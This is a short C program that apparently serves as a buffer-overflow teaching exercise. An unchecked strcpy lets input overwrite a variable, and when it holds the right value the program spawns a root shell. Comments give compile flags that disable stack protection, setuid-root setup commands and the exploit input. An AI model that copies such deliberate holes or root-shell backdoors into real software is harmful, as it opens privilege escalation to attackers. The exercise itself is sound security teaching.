// AFTER => bof3.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x12345678

// COMPILE $ gcc -fno-stack-protector bof4.c -o bof4
// SETUID  $ sudo chown root:root bof4
//         $ sudo chmod 4755 bof4
// EXPLOIT $ ./bof4 `py3 -c "print('\x78\x56\x34\x12'*36)"`

int main(int argc, char *argv[]){
    if (argc < 2) {
        fputs("\033[31m" "error :( this program needs some arguments\n" "\033[0m", stderr);
        return 1;
    }
    int innocent;
    char buf[BUF_SIZE];

    strcpy(buf, argv[1]);
    printf("Hello %s!\n", buf);

    if (innocent == KEY) {
        if (setuid(0)) {
            perror("setuid");
            return 1;
        }
        system("/bin/sh");
    }
    return 0;
}
